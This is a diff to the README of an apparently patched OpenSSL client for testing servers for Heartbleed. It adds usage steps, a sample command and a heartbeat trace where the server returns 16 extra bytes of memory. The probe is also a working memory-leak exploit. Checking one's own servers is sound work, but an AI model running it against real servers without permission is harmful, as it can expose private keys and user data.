@@ -3,20 +3,27 @@ test is non-invasive and won't return any server data. If you want to use
 an instrusive test (which is necessary to differentiate OpenSSL from
 GnuTLS), increase the value.
 
-To test:
+To test, invoke the patched version of OpenSSL, type B and press RETURN:
 
-$ ./openssl-heartbleed -connect www.example.com:443 -msg
-[...]
+    $ ./openssl-heartbleed -connect www.example.com:443 -msg
+
+A server that doesn't respond isn't vulnerable. A server that returns
+more data than it receives is vulnerable.
+
+This is an example of a server returning 16 bytes of server data
+(equivalent of setting PAYLOAD_EXTRA to 32).
+
 ---
 B
 HEARTBEATING
 >>> TLS 1.2  [length 0025], HeartbeatRequest
-    01 00 12 00 00 3c 83 1a 9f 1a 5c 84 aa 86 9e 20
-    c7 a2 ac d7 6f f0 c9 63 9b d5 85 bf 9a 47 61 27
-    d5 22 4c 70 75
-<<< TLS 1.2  [length 0025], HeartbeatResponse
-    02 00 12 00 00 3c 83 1a 9f 1a 5c 84 aa 86 9e 20
-    c7 a2 ac d7 6f 52 4c ee b3 d8 a1 75 9a 6b bd 74
-    f8 60 32 99 1c
+    01 00 32 00 00 7c e8 f5 62 35 03 bb 00 34 19 4d
+    57 7e f1 e5 90 6e 71 a9 26 85 96 1c c4 2b eb d5
+    93 e2 d7 bb 5f
+<<< TLS 1.2  [length 0045], HeartbeatResponse
+    02 00 32 00 00 7c e8 f5 62 35 03 bb 00 34 19 4d
+    57 7e f1 e5 90 6e 71 a9 26 85 96 1c c4 2b eb d5
+    93 e2 d7 bb 5f 6f 81 0f aa dc e0 47 62 3f 7e dc
+    60 95 c6 ba df c9 f6 9d 2b c8 66 f8 a5 45 64 0b
+    d2 f5 3d a9 ad
 read R BLOCK
-
